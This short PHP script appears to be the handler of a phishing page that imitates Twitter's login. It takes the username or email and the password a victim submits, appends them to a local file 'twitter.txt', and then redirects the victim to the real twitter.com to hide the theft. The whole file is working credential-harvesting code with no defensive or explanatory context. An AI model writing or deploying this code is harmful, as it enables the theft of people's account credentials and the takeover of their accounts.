<?php

file_put_contents("../datas/twitter.txt", "Account: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", 
FILE_APPEND);
header('Location: https://twitter.com/');
exit();
